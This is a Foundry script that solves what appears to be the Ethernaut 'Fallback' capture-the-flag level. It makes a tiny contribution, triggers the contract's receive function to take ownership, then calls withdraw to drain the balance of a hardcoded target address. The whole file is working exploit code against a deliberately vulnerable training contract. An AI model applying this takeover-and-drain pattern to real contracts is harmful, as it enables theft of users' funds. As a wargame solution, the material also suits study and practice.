// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Fallback-01.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FallbackSolution is Script {
    Fallback public fallbackInstance = Fallback(payable(0x46655b184f23e95E520645389A830679B72883ED));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        fallbackInstance.contribute{value: 1 wei}();
        address(fallbackInstance).call{value: 1 wei}("");
        address myAddress = vm.envAddress("MY_ADDRESS");
        console.log("New Owner:", fallbackInstance.owner());
        console.log("My Address:", myAddress);
        fallbackInstance.withdraw();
        console.log("New Balance",address(fallbackInstance).balance);
        console.log("My Balance", myAddress.balance);

        vm.stopBroadcast();
    }
}
